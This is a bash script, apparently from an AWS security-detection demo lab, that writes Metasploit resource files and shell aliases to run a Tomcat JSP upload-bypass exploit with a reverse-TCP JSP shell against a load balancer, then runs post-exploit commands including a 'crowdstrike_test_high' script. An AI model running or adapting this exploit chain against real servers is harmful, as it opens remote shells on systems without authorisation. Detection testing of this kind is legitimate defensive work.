#!/bin/bash
#myInvocation="$(printf %q "$BASH_SOURCE")$((($#)) && printf ' %q' "$@")"
LHOST=$(curl http://169.254.169.254/latest/meta-data/public-ipv4);
PRIVATE_IPADDRESS=$(curl http://169.254.169.254/latest/meta-data/local-ipv4);
TARGET_PORT='80';
LPORT='443';
AWS_REGION=$(curl --silent http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r .region);
TARGET_ADDRESS=$(aws elbv2 describe-load-balancers --query LoadBalancers[].DNSName --output text --region ${AWS_REGION})
#TARGET_ADDRESS='1.1.1.1'
startup ()
{
	#clear;
	create_kali_macros;
	setup_aliases;
	exit;
}

create_kali_macros ()
{
	# shellcheck disable=SC2024
	sudo cat >/home/admin/configure.rc <<EOL
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS ${TARGET_ADDRESS}
set LHOST ${LHOST}
set rport ${TARGET_PORT}
set LPORT ${LPORT}
EOL
	

	# shellcheck disable=SC2024
	sudo cat >/home/admin/startup.rc <<EOL
use exploit/multi/http/tomcat_jsp_upload_bypass
set rhosts ${TARGET_ADDRESS}
set rport ${TARGET_PORT}
set LHOST ${LHOST}
set LPORT ${LPORT}
set REVERSELISTENERBINDADDRESS ${PRIVATE_IPADDRESS}
set AutoRunScript post_exploit.rc
set payload java/jsp_shell_reverse_tcp
exploit -j
EOL

	# shellcheck disable=SC2024
	sudo cat >/home/admin/post_exploit.rc <<'EOL'
whoami
netstat -ano
bash crowdstrike_test_high
EOL
	sudo chown admin:admin /home/admin/*.rc
}

setup_aliases ()
{
	# shellcheck disable=SC2024
	sudo cat >>/home/admin/.bashrc <<'EOL'
function check_tomcat() {
	while true; do
	  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_ADDRESS}:${TARGET_PORT}")
	  if [ "$STATUS" -eq "200" ]; then
		echo "Tomcat is now ready!";
		break
	  else
		echo "Tomcat not ready yet..."
	  fi
	  sleep 10
	done
}

function run_attack() {
	check_tomcat;
	echo "Running Metasploit";
	msfconsole -qx "use exploit/multi/http/tomcat_jsp_upload_bypass;\
	set RHOSTS ${TARGET_ADDRESS};\
	set RPORT ${TARGET_PORT};\
	exploit"
}

function run_attack_auto() {
	check_tomcat;
	echo "Running Metasploit";
	msfconsole -qr startup.rc;
}

PROMPT=$'%F{%(#.white.red)}${debian_chroot:+($debian_chroot)──}(%B%F{%(#.yellow.white)}%n@%m%b%F{%(#.white.red)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.white.red)}]%B%(#.%F{yellow}#.%F{white}$)%b%F{reset} '
EOL
	#sudo chown kali:kali /home/kali/.zshrc
}




startup;